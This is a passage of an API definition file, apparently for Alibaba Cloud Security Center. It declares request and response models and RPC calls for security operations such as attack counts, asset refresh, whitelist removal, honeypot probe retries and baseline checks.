  statusCode: int32(name='statusCode'),
  body: PublicSyncAndCreateImageScanTaskResponseBody(name='body'),
}

async function publicSyncAndCreateImageScanTask(request: PublicSyncAndCreateImageScanTaskRequest): PublicSyncAndCreateImageScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'PublicSyncAndCreateImageScanTask', 'POST', '/', 'json', false, 'json', request);
}

model QueryAttackCountRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Body'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='175.0.XX.XX', position='Query'),
}

model QueryAttackCountResponseBody = {
  code?: string(name='Code', description='The HTTP status code returned.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='0'),
  data?: [ 
    {
      eventCount?: int32(name='EventCount', description='The number of times that the alert is triggered.', example='28'),
      tacticId?: string(name='TacticId', description='The stage ID of the ATT\\&CK attack.', example='TA0043'),
      tacticType?: string(name='TacticType', description='The type of stage of the ATT\\&CK attack.', example='Data collection'),
    }
  ](name='Data', description='An array that consists of the numbers of alert events in different attack phases.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D4BE7D77-5B02-5126-A684-A73F6CD3XXXX'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model QueryAttackCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryAttackCountResponseBody(name='body'),
}

async function queryAttackCount(request: QueryAttackCountRequest): QueryAttackCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryAttackCount', 'POST', '/', 'json', true, 'form', request);
}

model QueryDiscoverDatabaseRequest {
  createMark?: string(name='CreateMark', description='The ID of the scan task.

> You can call the [StartDiscoverDatabaseTask](~~StartDiscoverDatabaseTask~~) operation to query the ID of the task.', example='7f7b051f-7d1c-46da-b253-a03f3a27****', position='Query'),
}

model QueryDiscoverDatabaseResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  taskProgress?: int32(name='TaskProgress', description='The progress of the database scan task in percentage.', example='90'),
}

model QueryDiscoverDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryDiscoverDatabaseResponseBody(name='body'),
}

async function queryDiscoverDatabase(request: QueryDiscoverDatabaseRequest): QueryDiscoverDatabaseResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryDiscoverDatabase', 'POST', '/', 'json', false, 'json', request);
}

model QueryGroupIdByGroupNameRequest {
  groupName: string(name='GroupName', description='The name of the asset group.', example='TestGroupName', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX', position='Query'),
}

model QueryGroupIdByGroupNameResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model QueryGroupIdByGroupNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupIdByGroupNameResponseBody(name='body'),
}

/**
  * You can call the QueryGroupIdByGroupName operation to query the ID of an asset group to which your assets belong by using the name of the asset group. When you call operations such as [GetSuspiciousStatistics](~~GetSuspiciousStatistics~~) and [DeleteGroup](~~DeleteGroup~~), you must specify the ID of the asset group. To query the ID of an asset group, call the QueryGroupIdByGroupName operation.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
 */
async function queryGroupIdByGroupName(request: QueryGroupIdByGroupNameRequest): QueryGroupIdByGroupNameResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryGroupIdByGroupName', 'POST', '/', 'json', false, 'json', request);
}

model QueryGroupedSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Body'),
  disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **1**: Automatically Added to Whitelist
*   **2**: Defense Without Notification', example='1', position='Query'),
  eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location', position='Body'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Body'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Body'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Body'),
  remark?: string(name='Remark', description='The condition that is used to query alert events by asset. You can specify a value of the following types:

*   The IP address of the asset.
*   The public IP address of the asset.
*   The private IP address of the asset.
*   The name of the asset.', example='222.185.XX.XX', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.66.XX.XX', position='Query'),
}

model QueryGroupedSecurityEventMarkMissListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='31412647'),
      disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **auto\\_add_white**: Automatically Added to Whitelist
*   **defense\\_not_notification**: Defense Without Notification', example='auto_add_white'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The name of the alert event. The value indicates a type.', example='login_common_location'),
      eventType?: string(name='EventType', description='The subtype of the alert event.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The type of the alert event.', example='Unusual logon'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='type'),
      fieldValue?: string(name='FieldValue', description='The value of the field.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The alias of the field.', example='Logon Time'),
      operate?: string(name='Operate', description='The operator. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **strEqual**: equals
*   **strNotEqual**: does not equal
*   **regex**: regular expression', example='contains'),
      uuids?: string(name='Uuids', description='The UUIDs of assets. Multiple UUIDs are separated by commas (,).', example='6985b88c-eb19-4d27-98ad-e4a42312****,5721d503-9b04-4243-89ca-1fb8ca5e****,db2678c3-10e3-4a20-92f1-265f6****'),
    }
  ](name='List', description='An array that consists of the whitelist rules.'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='965F9282-D403-4FA2-B1B9-10F62DC719BF'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model QueryGroupedSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupedSecurityEventMarkMissListResponseBody(name='body'),
}

async function queryGroupedSecurityEventMarkMissList(request: QueryGroupedSecurityEventMarkMissListRequest): QueryGroupedSecurityEventMarkMissListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryGroupedSecurityEventMarkMissList', 'POST', '/', 'json', true, 'form', request);
}

model QueryJenkinsImageRegistryPersistenceDayRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.83.XXX.XXX', position='Query'),
}

model QueryJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: int32(name='Data', description='The retention period. Unit: days.', example='30'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA4AC8B7-0C18-5BC1-9DA4-798B3BE4****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model QueryJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function queryJenkinsImageRegistryPersistenceDay(request: QueryJenkinsImageRegistryPersistenceDayRequest): QueryJenkinsImageRegistryPersistenceDayResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryJenkinsImageRegistryPersistenceDay', 'POST', '/', 'json', false, 'json', request);
}

model QueryPreCheckDatabaseRequest {
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.

> You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ebc895506c6911ed800000163e0e****', position='Query'),
  taskId?: string(name='TaskId', description='The ID of the database precheck task.

> You can call the [StartPreCheckDatabase](~~StartPreCheckDatabase~~) operation to query the ID of the database precheck task.', example='t-000bc9nqwxsbyvod****', position='Query'),
  uniRegionId: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hangzhou', position='Query'),
}

model QueryPreCheckDatabaseResponseBody = {
  completedTime?: long(name='CompletedTime', description='The time when the precheck task was complete.', example='1657524396'),
  createdTime?: long(name='CreatedTime', description='The time when the precheck task was started.', example='1660448660'),
  description?: string(name='Description', description='The status of the precheck task. Valid values:

*   **completed**: complete
*   **created**: started
*   **error**: failed', example='completed'),
  progress?: int32(name='Progress', description='The precheck progress in percentage. Valid values: 0 to 100.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  result?: string(name='Result', description='The result of the precheck task. The value is a JSON string that contains the following fields:

*   **instanceId**: the ID of the server that hosts the database

*   **checkTime**: the precheck time

*   **sourceType**: the database type

*   **results**: the precheck item and result

    *   **item**: the precheck item
    *   **result**: the precheck result

> The following section describes the precheck items:

*   MSSQL

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE**: recovery mode check
    *   **SQL_SERVER_DB_NOT_ONLINE**: SQL Server database status check

*   ORACLE

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **ORACLE_INSTANCE_STATUS**: Oracle instance status check
    *   **ORACLE_DB_STATUS**: Oracle database status check
    *   **ARCHIVELOG**: archive mode check

*   MYSQL

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **MYSQL_VERSION**: Supports full backup version checking
    *   **MYSQL_BINLOG**: BINLOG check', example='[
    {
        "instanceId": "i-wz91if83t97xgtn2****",
        "checkTime": 1671245753,
        "sourceType": "MSSQL",
        "results":
        [
            {
                "item": "OSS_INTERNAL_ENDPOINT_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SERVICE_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE",
                "result": "WARNING"
            },
            {
                "item": "SQL_SERVER_DB_NOT_ONLINE",
                "result": "PASSED"
            }
        ]
    }
]'),
  updatedTime?: long(name='UpdatedTime', description='The time when the precheck task was last updated.', example='1671084106'),
}

model QueryPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryPreCheckDatabaseResponseBody(name='body'),
}

async function queryPreCheckDatabase(request: QueryPreCheckDatabaseRequest): QueryPreCheckDatabaseResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'QueryPreCheckDatabase', 'POST', '/', 'json', false, 'json', request);
}

model RebootMachineRequest {
  uuid: string(name='Uuid', description='The UUID of the server that you want to restart.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='7151f27e-1d51-4e98-a540-8936a****', position='Query'),
}

model RebootMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
}

model RebootMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RebootMachineResponseBody(name='body'),
}

async function rebootMachine(request: RebootMachineRequest): RebootMachineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RebootMachine', 'POST', '/', 'json', false, 'json', request);
}

model RefreshAssetsRequest {
  assetType?: string(name='AssetType', description='The type of the asset that you want to synchronize. Valid values:

*   **cloud_product**: Alibaba Cloud service
*   **ecs**: Elastic Compute Service (ECS) instance
*   **container_image**: container image', example='cloud_product', position='Query'),
  cloudAssetSubType?: int32(name='CloudAssetSubType', description='The subtype of the cloud service.

>  The following list describes the subtypes of cloud services.', example='0', position='Query'),
  cloudAssetType?: int32(name='CloudAssetType', description='The type of the cloud service. Valid values:

*   **0**: ECS
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)', example='0', position='Query'),
  vendor?: int32(name='Vendor', description='服务器厂商。取值：

- **0**：阿里云资产
- **1**：云外资产
- **2**：IDC资产
- **3**、**4**、**5**、**7**：其它云资产
- **8**：轻量级资产', example='0', position='Query'),
}

model RefreshAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
}

model RefreshAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshAssetsResponseBody(name='body'),
}

async function refreshAssets(request: RefreshAssetsRequest): RefreshAssetsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RefreshAssets', 'POST', '/', 'json', false, 'json', request);
}

model RefreshContainerAssetsRequest {
  assetType: string(name='AssetType', description='The type of the container asset whose statistics you want to refresh. Valid values:

*   **IMAGE**
*   **CONTAINER**', example='IMAGE', position='Query'),
}

model RefreshContainerAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2090F329-3658-49AF-820B-C4157FC31BCB'),
}

model RefreshContainerAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshContainerAssetsResponseBody(name='body'),
}

async function refreshContainerAssets(request: RefreshContainerAssetsRequest): RefreshContainerAssetsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RefreshContainerAssets', 'POST', '/', 'json', false, 'json', request);
}

model RefreshOssBucketScanInfoRequest {
}

model RefreshOssBucketScanInfoResponseBody = {
  requestId?: string(name='RequestId', example='CE290C1F-4B7D-5024-9D2F-E26D7B08****'),
}

model RefreshOssBucketScanInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshOssBucketScanInfoResponseBody(name='body'),
}

async function refreshOssBucketScanInfo(request: RefreshOssBucketScanInfoRequest): RefreshOssBucketScanInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RefreshOssBucketScanInfo', 'POST', '/', 'json', false, 'json', request);
}

model RemoveCheckInstanceResultWhiteListRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='11', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The IDs of instances. Separate multiple IDs with commas (,).', position='Query'),
}

model RemoveCheckInstanceResultWhiteListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F156EA41-8EEF-54B2-908B-EAE071XXXXXX'),
}

model RemoveCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function removeCheckInstanceResultWhiteList(request: RemoveCheckInstanceResultWhiteListRequest): RemoveCheckInstanceResultWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RemoveCheckInstanceResultWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model RemoveCheckResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='This parameter is deprecated.', example='Deprecated', position='Query'),
  checkIds?: [ long ](name='CheckIds', description='The IDs of check items.', position='Query'),
  type?: string(name='Type', description='This parameter is deprecated.', example='Deprecated', position='Query'),
}

model RemoveCheckResultWhiteListResponseBody = {
  code?: string(name='Code', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='98C82076-E0D5-51DA-99F2-513F4XXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model RemoveCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckResultWhiteListResponseBody(name='body'),
}

async function removeCheckResultWhiteList(request: RemoveCheckResultWhiteListRequest): RemoveCheckResultWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RemoveCheckResultWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model RetryAgentlessTaskRequest {
  taskId?: string(name='TaskId', description='The ID of the task. You can call the [ListAgentlessTask](~~ListAgentlessTask~~) operation to obtain the IDs of tasks.', example='5347c7b6-c85c-4070-846a-3029e08e****', position='Query'),
}

model RetryAgentlessTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model RetryAgentlessTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RetryAgentlessTaskResponseBody(name='body'),
}

async function retryAgentlessTask(request: RetryAgentlessTaskRequest): RetryAgentlessTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RetryAgentlessTask', 'POST', '/', 'json', false, 'json', request);
}

model RetryInstallProbeRequest {
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='c4c47cc1-f60a-4b2f-bcdb-9aed6644****', position='Query'),
}

model RetryInstallProbeResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4247271-7C31-5A54-9EA1-658D96ED****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model RetryInstallProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RetryInstallProbeResponseBody(name='body'),
}

async function retryInstallProbe(request: RetryInstallProbeRequest): RetryInstallProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RetryInstallProbe', 'POST', '/', 'json', false, 'json', request);
}

model RollbackSuspEventQuaraFileRequest {
  from?: string(name='From', example='sas', position='Query'),
  quaraFileId?: int32(name='QuaraFileId', example='3921797', position='Query'),
  sourceIp?: string(name='SourceIp', position='Query'),
}

model RollbackSuspEventQuaraFileResponseBody = {
  requestId?: string(name='RequestId', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model RollbackSuspEventQuaraFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RollbackSuspEventQuaraFileResponseBody(name='body'),
}

async function rollbackSuspEventQuaraFile(request: RollbackSuspEventQuaraFileRequest): RollbackSuspEventQuaraFileResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'RollbackSuspEventQuaraFile', 'POST', '/', 'json', false, 'json', request);
}

model SasInstallCodeRequest {
  sourceIp?: string(name='SourceIp', example='120.41.XX.XX', position='Query'),
}

model SasInstallCodeResponseBody = {
  requestId?: string(name='RequestId'),
  data?: string(name='data'),
}

model SasInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SasInstallCodeResponseBody(name='body'),
}

async function sasInstallCode(request: SasInstallCodeRequest): SasInstallCodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SasInstallCode', 'POST', '/', 'json', false, 'json', request);
}

model SaveImageBaselineStrategyRequest {
  baselineItemList: string(name='BaselineItemList', description='The baseline check items.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query baseline check items.', example='ak_leak', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  source?: string(name='Source', example='agentless', position='Query'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query the IDs of baseline check policies.', example='8639', position='Query'),
  strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default', position='Query'),
}

model SaveImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9AB5D3DE-6E0F-5633-AA71-4B90C724****'),
}

model SaveImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveImageBaselineStrategyResponseBody(name='body'),
}

async function saveImageBaselineStrategy(request: SaveImageBaselineStrategyRequest): SaveImageBaselineStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SaveImageBaselineStrategy', 'POST', '/', 'json', false, 'json', request);
}

model SaveSuspEventUserSettingRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas', position='Query'),
  levelsOn?: string(name='LevelsOn', description='The severities of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**', example='suspicious,serious,remind', position='Query'),
}

model SaveSuspEventUserSettingResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE6229A0-BDBE-534C-A3F8-095EBXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model SaveSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveSuspEventUserSettingResponseBody(name='body'),
}

async function saveSuspEventUserSetting(request: SaveSuspEventUserSettingRequest): SaveSuspEventUserSettingResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SaveSuspEventUserSetting', 'POST', '/', 'json', false, 'json', request);
}

model SetClusterInterceptionConfigRequest {
  clusterIds: string(name='ClusterIds', description='The ID of the cluster. Separate multiple cluster IDs with commas (,).

> You can call the [ListClusterInterceptionConfig](~~ListClusterInterceptionConfig~~) operation to query the IDs of clusters.', example='c60b77fe62093480db6164a3c2fa****', position='Query'),
  switchOn: int32(name='SwitchOn', description='Specifies whether to turn on the switch. Valid values:

*   **1**: yes
*   **0**: no', example='1', position='Query'),
  switchType: int32(name='SwitchType', description='The type of the switch that you want to configure. Valid values:

*   **0**: the interception switch
*   **1**: the interception type switch
*   **2**: the interception history switch', example='0', position='Query'),
}

model SetClusterInterceptionConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='74AB990C-539B-579B-9239-B8A2036B7337'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model SetClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetClusterInterceptionConfigResponseBody(name='body'),
}

async function setClusterInterceptionConfig(request: SetClusterInterceptionConfigRequest): SetClusterInterceptionConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SetClusterInterceptionConfig', 'POST', '/', 'json', false, 'json', request);
}

model SetImageSensitiveFileStatusRequest {
  imageUuids?: string(name='ImageUuids', example='f382fccd88b94c5c8c864def6815b854,ac32fccd88b94c5c8c864def6815bo9z', position='Query'),
  sensitiveFileKey?: string(name='SensitiveFileKey', example='pem', position='Query'),
  status?: int32(name='Status', example='0', position='Query'),
}

model SetImageSensitiveFileStatusResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    id?: long(name='Id', example='18551'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='20456DD5-5CBF-5015-9173-12CA4246****'),
  success?: boolean(name='Success', example='true'),
}

model SetImageSensitiveFileStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetImageSensitiveFileStatusResponseBody(name='body'),
}

async function setImageSensitiveFileStatus(request: SetImageSensitiveFileStatusRequest): SetImageSensitiveFileStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SetImageSensitiveFileStatus', 'POST', '/', 'json', false, 'json', request);
}

model SetRegistryScanDayNumRequest {
  scanDayNum: int32(name='ScanDayNum', description='The cycle at which you want to scan your images. Unit: days.', example='1', position='Query'),
}

model SetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48483161-F328-5A12-AB78-3EB81F37****'),
}

model SetRegistryScanDayNumResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetRegistryScanDayNumResponseBody(name='body'),
}

async function setRegistryScanDayNum(request: SetRegistryScanDayNumRequest): SetRegistryScanDayNumResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SetRegistryScanDayNum', 'POST', '/', 'json', false, 'json', request);
}

model SetSensitiveDefineRuleConfigRequest {
  config?: string(name='Config', example='[{\\"classKey\\": \\"password\\", \\"ruleList\\": [\\"huaweicloud_ak\\", \\"ak_leak\\"]}]', position='Query'),
}

model SetSensitiveDefineRuleConfigResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    id?: long(name='Id', example='44616'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  success?: boolean(name='Success', example='true'),
}

model SetSensitiveDefineRuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetSensitiveDefineRuleConfigResponseBody(name='body'),
}

async function setSensitiveDefineRuleConfig(request: SetSensitiveDefineRuleConfigRequest): SetSensitiveDefineRuleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'SetSensitiveDefineRuleConfig', 'POST', '/', 'json', false, 'json', request);
}

model StartBaselineSecurityCheckRequest {
  itemIds?: [ long ](name='ItemIds', description='The IDs of the check items.

> To perform a check task on cloud service configurations, you must specify the ID of the check item. You can call the [DescribeRiskItemType](~~DescribeRiskItemType~~) operation to query the IDs of check items.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the check task. Valid values:

*   **check**
*   **verify**', example='verify', position='Query'),
}

model StartBaselineSecurityCheckResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model StartBaselineSecurityCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartBaselineSecurityCheckResponseBody(name='body'),
}

/**
  * @deprecated
  *
 */
// Deprecated
async function startBaselineSecurityCheck(request: StartBaselineSecurityCheckRequest): StartBaselineSecurityCheckResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'StartBaselineSecurityCheck', 'POST', '/', 'json', false, 'json', request);
}

model StartDiscoverDatabaseTaskRequest {
}

